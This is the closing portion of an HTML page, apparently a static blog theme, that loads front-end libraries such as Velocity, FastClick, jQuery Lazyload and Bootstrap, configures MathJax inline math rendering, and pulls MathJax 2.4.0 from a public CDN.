<script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

<script type="text/javascript" src="/js/motion.js?v=0.4.5.2" id="motion.global"></script>


  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  

  <script type="text/javascript" src="/js/bootstrap.js"></script>

  
  
  <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
  </script>

  <script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for (i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  </script>

  
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/MathJax.js"></script>
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/config/TeX-AMS-MML_HTMLorMML.js"></script>
  


  
  

</body>
</html>
